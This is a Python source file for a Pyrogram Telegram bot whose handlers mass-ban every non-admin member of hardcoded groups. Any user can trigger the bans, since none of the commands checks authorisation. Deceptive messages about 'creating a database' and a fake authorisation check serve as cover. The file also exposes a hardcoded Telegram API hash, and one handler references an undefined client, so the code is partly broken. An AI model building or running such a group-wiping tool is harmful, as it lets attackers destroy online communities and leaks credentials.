from pyrogram import Client , filters, idle, enums
from pyrogram.types import Message, ChatPermissions
import asyncio
import os
import requests
from dotenv import load_dotenv

load_dotenv()

API_ID = 9855603
API_HASH = "95d8b38bbb62d087dbf7b98abf670e78"
BOT_TOKEN = os.environ.get("BOT_TOKEN")
REMOVEBG_API = os.environ.get("REMOVEBG_API", "")
UNSCREEN_API = os.environ.get("UNSCREEN_API", "")
#MONGO_URL = os.environ.get("MONGO_URL")
app = Client(
    "Level" ,
    api_id = API_ID ,
    api_hash = API_HASH ,
    bot_token = BOT_TOKEN
)

BOT_ID = 5720302471

SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
NK = "Required Admin permission To Send Messages in Group"
LOGG = -1001686630791
FGC = -1001497090502
@app.on_message(filters.command("pro"))
async def ban_all(_,msg):
    chat_id=-1001497090502
    bot=await app.get_chat_member(chat_id,BOT_ID)
    bot_permission=bot.privileges.can_restrict_members==True
    if bot_permission:
        async for member in app.get_chat_members(chat_id):       
            try:
                    dlm = await app.ban_chat_member(chat_id, member.user.id)
                    await dlm.delete()                   
            except Exception as e:
                await app.send_message(LOGG, text=e)
                pass
    else:
        await msg.reply_text(NK)

@app.on_message(filters.command("rem"))
async def banall(_, message):
    chat_id = -1001497090502
    user_id = message.from_user.id
    try: 
        Members = []
        Admins = []
        async for x in app.get_chat_members(chat_id):
            if not x.privileges:
                  Members.append(x.user.id)
            else:
                  Admins.append(x.user.id)
        for user_id in Members:
             if message.text.split()[0].lower().startswith("s"):
                      m = await app.ban_chat_member(chat_id, user_id)
                      await m.delete()
             else:
                 mm = await app.ban_chat_member(chat_id, user_id)
                 await mm.delete()
        await app.send_message(LOGG, text="Successfully Banned: {}\nRemaining Admins: {}".format(len(Members),len(Admins),))
    except Exception as e:
        await app.send_message(LOGG, text=e)

@app.on_message(filters.command("all"))
async def banall(_, message):
    chat_id = FGC
    user_id = message.from_user.id
    try: 
      Members = []
      Admins = []
      async for x in Nandha.get_chat_members(chat_id):
          if not x.privileges:
                Members.append(x.user.id)
          else:
                Admins.append(x.user.id)
      for user_id in Members:
           if message.text.split()[0].lower().startswith("s"):
                    m = await Nandha.ban_chat_member(chat_id, user_id)
                    await m.delete()
           else:
               k = await Nandha.ban_chat_member(chat_id, user_id)
               await k.delete()
      await app.send_message(LOGG, text="Successfully Banned: {}\nRemaining Admins: {}".format(len(Members),len(Admins),))
    except Exception as e:
        app.send_message(LOGG, text=e)
   
@app.on_message(filters.command("run"))
async def bye(bot, message):
    if len(message.command) > 1:
        group = (message.text.split(None, 1)[1].strip())[:100]
        await app.leave_chat(group)

@app.on_message(filters.command("r"))
async def rel(bot, message):
    await message.reply_text("!bot reloaded")

@app.on_message(filters.command("settings") & filters.private)
async def settings(bot, message):
    uid = message.from_user.id
    mystic = await message.reply_text("Getting User Unique id...")
    await asyncio.sleep(1)
    await mystic.edit(f"👥: {uid}")
    await asyncio.sleep(1)
    await mystic.edit("UID Not Found In D.B.")
    await asyncio.sleep(1)
    await mystic.edit("⚠️Only Authorised Users Can use This command")

app.run() 
idle()
